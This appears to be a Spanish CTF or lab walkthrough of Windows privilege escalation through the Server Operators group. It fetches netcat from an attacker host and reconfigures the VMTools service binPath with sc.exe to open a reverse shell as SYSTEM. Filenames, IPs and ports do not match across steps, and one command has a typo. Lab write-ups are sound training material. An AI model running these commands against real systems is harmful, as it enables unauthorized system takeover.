#serveroperatorsgroup


------
Usamos [[whoami]] con el comando `whoami /all` para ver todos los permisos que tiene nuestro usuario y vemos el 


![[Return31.png]]
Vamos a guiarnos con este [articulo](https://www-hackingarticles-in.translate.goog/windows-privilege-escalation-server-operator-group/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es) para hacer la escalada

Tambien con [[net user]] usando el comando `net user svc-printer` podemos mostrar los detalles del acuenta
![[Return24.png]]

Ahora con el comando [[services]] vamos a enumerar todos los ervicios de windows instalados en la amquina
![[Return25.png]]

Ahora vamos a pasarnos el [[Netcat]] levantando un servidor desde nuestra maquina de atacante con [[python3 -m http.server]] usando el comando `python3 -m http.server 80`

![[Return27.png]]
Ahora con [[cd]] vamos a usar `cd C:\` y luego vamos a crear con [[mkdir]] usando el comando `mkdir temp`  y luego encontramos con `cd temp`.  Esto lo hacemos para estar en una carpeta que no vayamos a tener ningun problema con los permisos
Con [[wget]] vamos a descargarlo desde la maquina victima con el coando `wget http://10.10.16.69/nc64.exe -outfile nc64.exe`


![[Return26.png]]
Ahora vamos a ejecutar las instrucciones que nos da el articulo para enviarnos una [[Reverse shell]] mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]]
La idea es que configuremos el servicio de vm para que ejecute la accion de la [[Reverse shell]] y a posteriori reiniciamos el servicio asi se ejecuta nuesstra nueva instruccion

```
sc.exe config VMTools binPath= "C:\temp\nc.exe -e cmd.exe 192.168.1.205 1234"           /Cargamos la configuracion
sc.exe stop VMTools        /Paramos el servicio
sc.exe star VMTools        /Volvemos a iniciar el servicio
```
![[Return28.png]]

![[Return29.png]]
Y listo ya somos root y podemos catear las flags

![[Return32.png]]
![[Return30.png]]
